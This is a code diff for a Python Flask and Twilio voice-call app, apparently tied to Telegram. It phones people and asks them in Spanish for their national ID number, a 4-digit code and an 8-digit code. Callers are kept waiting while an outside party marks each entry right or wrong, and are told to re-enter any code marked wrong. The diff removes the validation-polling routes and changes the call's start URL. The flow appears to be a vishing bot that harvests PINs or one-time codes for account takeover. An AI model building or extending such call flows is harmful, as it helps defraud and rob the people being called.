@@ -102,7 +102,7 @@ def make_call():
     
     # Construir la URL correctamente
     base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
-    url = f"{base_url}/step1"
+    url = f"{base_url}/start"
     status_callback_url = f"{base_url}/call-status-callback"
     
     logger.info(f"📞 URL para la llamada: {url}")
@@ -265,7 +265,6 @@ def start():
         response.redirect('/step1')
     
     return str(response)
-
 
 
 # STEP 1: CÉDULA (PRIMERO)
@@ -787,157 +786,6 @@ def final_validation_result():
             response.redirect(f"/final-validation-result?sid={call_sid}")
         else:
             response.redirect(f"/final-validation-result?sid={call_sid}")
-    
-    return str(response)
-
-# El resto del código de validate-result permanece igual, solo hay que actualizar las referencias:
-@app.route('/validate-result', methods=['GET', 'POST'])
-def validate_result():
-    call_sid = request.values.get('sid')
-    logger.info(f"⚠️ VERIFICANDO VALIDACIÓN PARA SID: {call_sid}")
-    
-    # Usar otra estrategia para conseguir el SID si no se pasó como parámetro
-    if not call_sid and request.values.get('CallSid'):
-        call_sid = request.values.get('CallSid')
-        logger.info(f"📞 Usando CallSid del request: {call_sid}")
-    
-    # Si no tenemos SID, no podemos hacer nada
-    if not call_sid:
-        logger.error("❌ No se pudo obtener el SID para validación")
-        response = VoiceResponse()
-        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
-        return str(response)
-    
-    # Verificar si SID existe en sesiones
-    if call_sid not in global_user_sessions:
-        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones")
-        response = VoiceResponse()
-        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
-        return str(response)
-    
-    # Verificar si existe la clave 'validacion'
-    validation = global_user_sessions.get(call_sid, {}).get('validacion')
-    logger.info(f"⚠️ ESTADO DE VALIDACIÓN PARA SID={call_sid}: {validation}")
-
-    response = VoiceResponse()
-
-    # Si tenemos una validación
-    if validation:
-        logger.info(f"⚠️ VALIDACIÓN ENCONTRADA PARA SID={call_sid}: {validation}")
-        
-        # Resetear el contador de intentos ya que tenemos una validación
-        count_key = f"{call_sid}_retry_count"
-        if count_key in global_user_sessions.get(call_sid, {}):
-            global_user_sessions[call_sid][count_key] = 0
-            save_session_to_file(global_user_sessions)
-        
-        if validation == [1, 1, 1]:
-            response.say("Verificación completada con éxito. Todos los datos son correctos. Gracias por su paciencia.", language='es-ES')
-            return str(response)
-        else:
-            # Mensaje general cuando hay errores
-            response.say("Hemos detectado algunos problemas con la información proporcionada.", language='es-ES')
-            
-            # Verificar qué dato es incorrecto y redirigir (nuevo orden)
-            if validation[0] == 0:  # Cédula incorrecta
-                logger.info(f"⚠️ REDIRIGIENDO A PASO 1 - CÉDULA INCORRECTA PARA SID={call_sid}")
-                response.say("La cédula ingresada parece ser incorrecta. Por favor, ingrésela nuevamente.", language='es-ES')
-                response.redirect('/step1')
-            elif validation[1] == 0:  # Código de 4 dígitos incorrecto
-                logger.info(f"⚠️ REDIRIGIENDO A PASO 2 - CÓDIGO 4 DÍGITOS INCORRECTO PARA SID={call_sid}")
-                response.say("El código de 4 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
-                response.redirect('/step2')
-            elif validation[2] == 0:  # Código de 8 dígitos incorrecto
-                logger.info(f"⚠️ REDIRIGIENDO A PASO 3 - CÓDIGO 8 DÍGITOS INCORRECTO PARA SID={call_sid}")
-                response.say("El código de 8 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
-                response.redirect('/step3')
-            return str(response)
-    else:
-        # Añadimos un contador para evitar bucles infinitos
-        count_key = f"{call_sid}_retry_count"
-        retry_count = global_user_sessions.get(call_sid, {}).get(count_key, 0)
-        
-        # Si llevamos más de 8 intentos, finalizamos la llamada
-        if retry_count > 8:
-            logger.warning(f"⚠️ DEMASIADOS INTENTOS ({retry_count}) PARA SID={call_sid}. FINALIZANDO LLAMADA.")
-            response.say("Lo sentimos, no hemos recibido validación después de varios intentos. Finalizando llamada.", language='es-ES')
-            return str(response)
-        
-        # Incrementar contador
-        if call_sid in global_user_sessions:
-            global_user_sessions[call_sid][count_key] = retry_count + 1
-            save_session_to_file(global_user_sessions)
-            logger.info(f"⚠️ ESPERANDO VALIDACIÓN PARA SID={call_sid}. INTENTO {retry_count + 1}")
-        
-        # Mensajes variados para que no suene repetitivo
-        if retry_count % 3 == 0:
-            response.say("Seguimos validando sus datos. Gracias por su paciencia.", language='es-ES')
-        elif retry_count % 3 == 1:
-            response.say("Continuamos con el proceso de verificación. Por favor espere un momento más.", language='es-ES')
-        else:
-            response.say("Sus datos están siendo procesados. La validación está en curso.", language='es-ES')
-            
-        # Añadir una pausa de 10 segundos entre mensajes de voz
-        response.pause(length=10)
-        
-        # Verificar explícitamente si hay validación antes de continuar
-        if call_sid in global_user_sessions and 'validacion' in global_user_sessions[call_sid]:
-            logger.info(f"✅ VALIDACIÓN DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
-            response.redirect(f"/validate-result?sid={call_sid}")
-        else:
-            response.redirect(f"/validate-result?sid={call_sid}")
-    
-    return str(response)
-
-@app.route('/waiting-validation', methods=['POST', 'GET'])
-def waiting_validation():
-    """
-    Ruta específica para mostrar un mensaje de espera mientras se validan los datos.
-    """
-    call_sid = request.values.get('CallSid')
-    wait_time = int(request.values.get('wait', 10))
-    is_revalidation = request.values.get('revalidation', 'false').lower() == 'true'
-    
-    logger.info(f"⏳ ESPERANDO VALIDACIÓN PARA SID={call_sid}, TIEMPO={wait_time}s, REVALIDACIÓN={is_revalidation}")
-    
-    # Si no tenemos SID, no podemos hacer nada
-    if not call_sid:
-        logger.error("❌ No se pudo obtener el CallSid para la espera de validación")
-        response = VoiceResponse()
-        response.say("Lo sentimos, hubo un error en el proceso. Finalizando llamada.", language='es-ES')
-        return str(response)
-    
-    # Verificar inmediatamente si ya hay una validación
-    if call_sid in global_user_sessions and 'validacion' in global_user_sessions[call_sid]:
-        logger.info(f"⚠️ VALIDACIÓN YA EXISTENTE PARA SID={call_sid}: {global_user_sessions[call_sid]['validacion']}")
-        response = VoiceResponse()
-        response.redirect(f"/validate-result?sid={call_sid}")
-        return str(response)
-    
-    # Verificar si SID existe en sesiones
-    if call_sid not in global_user_sessions:
-        logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones durante la espera")
-        response = VoiceResponse()
-        response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
-        return str(response)
-    
-    response = VoiceResponse()
-    
-    # Añadir un mensaje personalizado de espera
-    if is_revalidation:
-        response.say("Estamos validando sus datos actualizados. Por favor espere unos momentos.", language='es-ES')
-    else:
-        response.say("Estamos validando sus datos. Por favor espere unos momentos.", language='es-ES')
-    
-    # tiempo de pausa en segundos
-    response.pause(length=10)
-    
-    # Redirigir a la verificación de resultados después de la espera
-    if call_sid in global_user_sessions and 'validacion' in global_user_sessions[call_sid]:
-        logger.info(f"✅ VALIDACIÓN DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
-        response.redirect(f"/validate-result?sid={call_sid}")
-    else:
-        response.redirect(f"/validate-result?sid={call_sid}")
     
     return str(response)
 
